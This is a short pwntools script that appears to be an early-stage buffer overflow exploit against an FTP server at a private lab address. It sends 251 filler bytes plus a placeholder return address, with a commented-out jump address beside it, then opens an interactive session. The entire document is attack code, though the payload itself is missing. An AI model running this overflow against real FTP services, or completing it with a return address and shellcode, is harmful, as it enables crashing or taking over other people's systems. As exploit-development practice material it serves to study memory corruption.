#!/usr/bin/python
from pwn import *
p = remote("192.168.18.130",21)
shellcode = 'A'*251 + "ABCD"#"\x7b\x46\x86\x7c"
p.sendline(shellcode)
p.interactive()

